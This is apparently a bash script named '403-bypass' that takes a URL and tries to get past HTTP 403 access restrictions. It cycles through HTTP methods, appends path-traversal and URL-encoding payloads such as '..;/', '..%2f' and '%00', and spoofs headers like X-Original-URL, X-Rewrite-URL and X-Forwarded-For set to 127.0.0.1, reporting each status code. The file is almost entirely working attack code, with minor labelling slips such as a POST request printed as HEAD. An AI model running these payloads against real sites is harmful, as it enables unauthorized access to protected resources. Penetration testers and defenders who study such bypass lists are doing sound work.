#!/bin/bash
target=$(echo $1|cut -d "/" -f1-3)
path=$(echo $1|cut -d "/" -f4)
#############
echo "#################################"
echo "     _______403-bypass______     "
echo "#################################"
#############
echo  "    ------------"
echo  "     HTTP METHOD"
echo  "    ____________"
echo -n "...GET..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null -X GET

echo -n "...HEAD..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null -X POST

echo -n "...HEAD..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null  -I

echo -n "...POPTIONS..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null -X OPTIONS

echo -n "...PUT..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null -X PUT

echo -n "...TRACK..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null -X TRACK

echo -n "...CONNECT..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null -X CONNECT

echo -n "...PATCH..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null -X PATCH

echo -n "...UPDATE..."
curl -ks "$1" -w '%{http_code}\n' -L -o /dev/null -X UPDATE

echo  "________________________"
echo  "--------url method------"
echo  "------------------------"
curl -k -s -o /dev/null -iL -w "Payload [ & ]\t:\t\t"'%{http_code}\n' "$1&"
curl -k -s -o /dev/null -iL -w "Payload [ % ]\t:\t\t"'%{http_code}\n' "$1%"
curl -k -s -o /dev/null -iL -w "Payload [ %09 ]:\t\t"'%{http_code}\n' "$1%09"
curl -k -s -o /dev/null -iL -w "Payload [ ../ ]:\t\t"'%{http_code}\n' "$1../"
curl -k -s -o /dev/null -iL -w "Payload [.././ ]:\t\t"'%{http_code}\n' "$1.././"
curl -k -s -o /dev/null -iL -w "Payload [ ..%2f ]:\t\t"'%{http_code}\n' "$1..%2f"
curl -k -s -o /dev/null -iL -w "Payload [ ..%00/ ]:\t\t"'%{http_code}\n' "$1..%00/"
curl -k -s -o /dev/null -iL -w "Payload [..%0d/ ]:\t\t"'%{http_code}\n' "$1..%0d/"
curl -k -s -o /dev/null -iL -w "Payload [ ..%5c]:\t\t"'%{http_code}\n' "$1..%5c"
curl -k -s -o /dev/null -iL -w "Payload [ ..\ ]:\t\t"'%{http_code}\n' "$1..\\"
curl -k -s -o /dev/null -iL -w "Payload [ ..%ff/ ]:\t\t"'%{http_code}\n' "$1..%ff/"
curl -k -s -o /dev/null -iL -w "Payload [ %2e%2e%2f ]:\t\t"'%{http_code}\n' "$1%2e%2e%2f"
curl -k -s -o /dev/null -iL -w "Payload [ .%2e/]:\t\t"'%{http_code}\n' "$1.%2e/"
curl -k -s -o /dev/null -iL -w "Payload [ %3f ]:\t\t"'%{http_code}\n' "$1%3f"
curl -k -s -o /dev/null -iL -w "Payload [ %26 ]:\t\t"'%{http_code}\n' "$1%26"
curl -k -s -o /dev/null -iL -w "Payload [ %23 ]:\t\t"'%{http_code}\n' "$1%23"
curl -k -s -o /dev/null -iL -w "Payload [ %2e ]:\t\t"'%{http_code}\n' "$1%2e"
curl -k -s -o /dev/null -iL -w "Payload [ /.]:\t\t\t"'%{http_code}\n' "$1/."
curl -k -s -o /dev/null -iL -w "Payload [ ? ]:\t\t\t"'%{http_code}\n' "$1?"
curl -k -s -o /dev/null -iL -w "Payload [ ?? ]:\t\t\t"'%{http_code}\n' "$1??"
curl -k -s -o /dev/null -iL -w "Payload [ ??? ]:\t\t"'%{http_code}\n' "$1???"
curl -k -s -o /dev/null -iL -w "Payload [ // ]:\t\t\t"'%{http_code}\n' "$1//"
curl -k -s -o /dev/null -iL -w "Payload [ /./ ]:\t\t"'%{http_code}\n' "$1/./"
curl -k -s -o /dev/null -iL -w "Payload [ .//./ ]:\t\t"'%{http_code}\n' "$1.//./"
curl -k -s -o /dev/null -iL -w "Payload [ //?anything ]:\t"'%{http_code}\n' "$1//?anything"
curl -k -s -o /dev/null -iL -w "Payload [ # ]:\t\t\t"'%{http_code}\n' "$1#"
curl -k -s -o /dev/null -iL -w "Payload [ / ]:\t\t\t"'%{http_code}\n' "$1/"
curl -k -s -o /dev/null -iL -w "Payload [ /.randomstring ]:\t"'%{http_code}\n' "$1/.randomstring"
curl -k -s -o /dev/null -iL -w "Payload [ ..;/ ]:\t\t"'%{http_code}\n' "$1..;/"
curl -k -s -o /dev/null -iL -w "Payload [.html]:\t\t"'%{http_code}\n' "$1.html"
curl -k -s -o /dev/null -iL -w "Payload [%20/]:\t\t\t"'%{http_code}\n' "$1%20/"
curl -k -s -o /dev/null -iL -w "Payload [%20path%20/]:\t\t"'%{http_code}\n' "$target/%20$path%20/"
curl -k -s -o /dev/null -iL -w "Payload [.json]:\t\t"'%{http_code}\n' "$1.json"
curl -k -s -o /dev/null -iL -w "Payload [\..\.\]:\t\t"'%{http_code}\n' "$1\..\.\\"



echo "______________________________"
echo "      HTTP  HEaDeR BYPASS "
echo "------------------------------"


curl -ks -o /dev/null -iL -w "Referer payload:\t"'%{http_code}\n' -H "Referer: $1" -X GET "$1"
curl -ks -o /dev/null -L -w "X-Custom-IP-Authorization PAYLOAD:\t"'%{http_code}\n' -H 'X-Custom-IP-Authorization: 127.0.0.1' -X GET "$1"
curl -ks -o /dev/null -L -w "X-Custom-IP-Authorization+..;/ PAYLOAD:\t"'%{http_code}\n' -H 'X-Custom-IP-Authorization+..;/: 127.0.0.1' -X GET "$1"
curl -ks -o /dev/null -L -w "X-Original-URL Payload:\t"'%{http_code}\n' -H "X-Original-URL: /$path" -X GET "$target/anything"
curl -ks -o /dev/null -L -w "X-Rewrite-URL payload:\t"'%{http_code}\n' -H "X-Rewrite-URL: /$path" -X GET "$target"
curl -ks -o /dev/null -L -w "X-Originating-IP payload:\t"'%{http_code}\n' -H 'X-Originating-IP: 127.0.0.1' -X GET "$1"
curl -ks -o /dev/null -L -w "X-Forwarded-For payload:\t"'%{http_code}\n' -H 'X-Forwarded-For: 127.0.0.1' -X GET "$1"
curl -ks -o /dev/null -L -w "X-Remote-IP payload:\t"'%{http_code}\n' -H 'X-Remote-IP: 127.0.0.1' -X GET "$1"
curl -ks -o /dev/null -L -w "X-Client-IP payload:\t"'%{http_code}\n' -H 'X-Client-IP: 127.0.0.1' -X GET "$1"
